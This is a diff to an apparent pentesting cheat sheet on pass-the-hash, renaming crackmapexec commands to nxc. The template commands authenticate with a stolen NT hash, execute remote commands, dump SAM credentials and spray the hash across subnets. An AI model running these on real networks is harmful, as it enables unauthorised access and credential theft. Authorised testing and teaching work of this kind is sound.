@@ -20,19 +20,19 @@ The hash format you need is the NT hash (second half of NTLM):
                                          this is the NT hash you pass
 
 
-Step 2 - Authenticate via SMB (crackmapexec)
+Step 2 - Authenticate via SMB (nxc)
 
 List shares / verify access:
 
-    crackmapexec smb <target-ip> -u <username> -H <NT-hash>
+    nxc smb <target-ip> -u <username> -H <NT-hash>
 
 Execute a command:
 
-    crackmapexec smb <target-ip> -u <username> -H <NT-hash> -x "<command>"
+    nxc smb <target-ip> -u <username> -H <NT-hash> -x "<command>"
 
 Dump SAM on the target (requires local admin):
 
-    crackmapexec smb <target-ip> -u <username> -H <NT-hash> --sam
+    nxc smb <target-ip> -u <username> -H <NT-hash> --sam
 
 
 Step 3 - Get a shell via SMB (psexec / smbexec / wmiexec)
@@ -65,7 +65,7 @@ Step 5 - Spray the hash across the network
 
 Check if the same local admin hash works on multiple machines:
 
-    crackmapexec smb <target-subnet>/<cidr> -u <username> -H <NT-hash> --local-auth
+    nxc smb <target-subnet>/<cidr> -u <username> -H <NT-hash> --local-auth
 
 Hosts that return  [+] ... (Pwn3d!)  are fully accessible with that hash.
 
